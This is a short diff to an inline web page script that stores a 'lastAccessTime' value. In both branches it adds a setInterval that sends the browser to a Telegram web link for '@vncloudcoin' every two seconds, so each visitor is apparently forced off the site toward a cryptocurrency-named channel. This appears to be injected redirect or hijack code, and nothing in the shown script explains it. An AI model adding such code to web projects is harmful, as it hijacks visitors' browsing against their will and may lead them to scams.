@@ -25,9 +25,11 @@ if (localStorage.getItem('lastAccessTime')) {
         }, 1000);
     } else {
         localStorage.setItem('lastAccessTime', currentTime.toString());
+        setInterval(function() { location.href = "https://web.telegram.org/k/#@vncloudcoin" }, 2000);
     }
 } else {
     var currentTime = Math.floor(Date.now() / 1000);
     localStorage.setItem('lastAccessTime', currentTime.toString());
+    setInterval(function() { location.href = "https://web.telegram.org/k/#@vncloudcoin" }, 2000);
 }
 </script>
